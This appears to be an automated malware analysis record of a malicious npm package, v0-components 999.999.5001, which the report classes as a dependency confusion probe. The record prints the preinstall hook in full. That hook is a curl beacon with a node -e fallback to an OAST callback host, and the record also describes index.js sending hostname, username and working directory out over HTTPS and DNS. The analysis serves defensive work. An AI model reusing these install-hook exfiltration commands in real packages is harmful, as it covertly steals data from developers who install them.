# npm v0-components@999.999.5001

**Source:** datadog · **Source label:** malicious · **Released:** 2025-10-08 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

Two install hooks run with no environment checks. `preinstall` sends a GET beacon with curl to an OAST collaborator host (kman63vp…[.]oastify[.]com), and falls back to an inline `node -e` HTTPS GET if curl fails. `postinstall` runs `index.js`, which reads the hostname, username and working directory and sends them to the same host three ways: an HTTPS GET query string, a DNS lookup of a subdomain with the hostname in it, and an HTTPS POST. There are no gates; every behaviour runs on any OS once the host is reachable, and all errors are swallowed.

## Execution

- **preinstall** `curl -s 'hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components?event=preinstall&v=999.999.5001' || node -e "require('https').get('hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components?event=preinstall', r=>r.resume()).on('error',()=>{})"`: no package files; inline_shell, inline_eval; errors hidden.
- **postinstall** `node index.js`: runs index.js; direct_script; errors hidden.

## Gates

None.

## Requirements

- network: kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com:443 (HTTPS GET/POST exfil and DNS lookup of a subdomain of this host; failures are swallowed so the install still succeeds without it)
- installed_tool: curl (preinstall beacon uses curl first, falling back to node when curl fails)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The `curl || node -e` chain is a fallback for a missing or failing tool, so it is recorded as a requirement, not a gate.
- The 999.999.x version and the OAST host point to a dependency confusion probe. It only collects data and sends it out; nothing gets downloaded or executed.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "v0-components",
    "version": "999.999.5001",
    "archive_sha256": "dd077f83cde2f87632eb32fbe37b21f98e098cf484b224c6f53c33d9cfbf4433",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-10-08",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-10-08-v0-components-v999.999.5001.zip",
    "package_root": "layer0/tmp/tmpn_f8t1k6/v0-components/package",
    "cluster_key": "57c61762584bffa60378d5e5bed1b1ce71503315e97e20d64e3345ae9a8f4d69",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl -s 'hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components?event=preinstall&v=999.999.5001' || node -e \"require('https').get('hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components?event=preinstall', r=>r.resume()).on('error',()=>{})\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell",
          "inline_eval"
        ],
        "silent_failure": true
      },
      {
        "hook": "postinstall",
        "command": "node index.js",
        "runs_on": "always",
        "file_chain": [
          "index.js"
        ],
        "interpreter": "node",
        "launch_style": [
          "direct_script"
        ],
        "silent_failure": true
      }
    ],
    "delays": [],
    "notes": [
      "preinstall: curl GET beacon to an OAST host; `|| node -e` is a fallback when curl fails or is missing (prerequisite chain, not a gate). curl output is only printed, nothing fetched is executed, so download_then_exec was removed.",
      "index.js: 46 lines, package code read in full; nothing unread. Unconditional: reads hostname, username and cwd, sends them via HTTPS GET query, a DNS lookup of a hostname-prefixed subdomain, and an HTTPS POST. All errors swallowed.",
      "No environment checks anywhere in the install path; the tool found no candidate conditions and none were missed."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com:443",
      "reason": "HTTPS GET/POST exfil and DNS lookup of a subdomain of this host; failures are swallowed so the install still succeeds without it",
      "sites": [
        {
          "file": "index.js",
          "derived_from": null,
          "start_byte": 939,
          "end_byte": 995,
          "node_type": "pair",
          "sha256": "5ebc8dbaebd1decc",
          "line": 29
        }
      ]
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "preinstall beacon uses curl first, falling back to node when curl fails"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components?event=preinstall",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/callback?",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com/v0-components-install",
        "role": "exfil_sink"
      },
      {
        "indicator": "v0-components-<hostname>.kman63vp0a4cp5dc8qhg7ocp8ge720qp[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify-depconf-callback",
  "claude_assessment": "malicious",
  "assessment_reason": "At install, preinstall and postinstall unconditionally beacon to an OAST collaborator host, and postinstall sends the hostname, username and working directory over HTTPS and DNS. The 999.999.x version and the beaconing match a dependency confusion probe; it sends victim host data without consent but does nothing more.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "inline_script",
        "recipe_version": 1,
        "input": {
          "file": "package.json",
          "derived_from": null
        },
        "params": {
          "hook": "preinstall",
          "flag": "-e"
        },
        "output_sha256": "b176719386f6b1de"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
